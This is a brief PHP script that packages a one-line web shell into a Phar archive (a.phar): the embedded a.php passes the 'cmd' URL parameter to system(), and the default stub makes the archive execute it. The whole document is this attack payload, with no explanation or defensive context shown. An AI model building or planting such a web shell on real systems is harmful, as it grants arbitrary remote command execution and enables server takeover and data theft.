<?php

$phar = new Phar( 'a.phar',0 );
$phar['a.php'] = '<?php system($_GET["cmd"]);';
$stub = $phar->createDefaultStub( 'a.php' );
$phar->setStub( $stub );